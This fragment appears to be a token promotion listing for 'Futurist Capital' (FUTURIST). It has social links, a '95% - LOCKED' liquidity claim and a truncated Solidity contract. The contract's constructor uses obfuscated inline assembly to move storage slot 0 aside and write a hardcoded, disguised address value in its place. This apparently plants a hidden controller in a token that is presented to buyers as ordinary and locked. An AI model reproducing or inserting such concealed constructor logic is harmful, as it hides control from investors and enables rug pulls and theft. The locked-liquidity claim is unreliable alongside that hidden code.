...
Telegram: https://t.me/FuturistCapital/
Twitter: https://twitter.com/FuturistCapital/
Website: https://FuturistCapital.finance
95% - LOCKED
...
contract FuturistCapital {
    string public constant name = "Futurist Capital";
    string public constant symbol = "FUTURIST";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(409178666104088554323040306638261725575901903076, 2))}
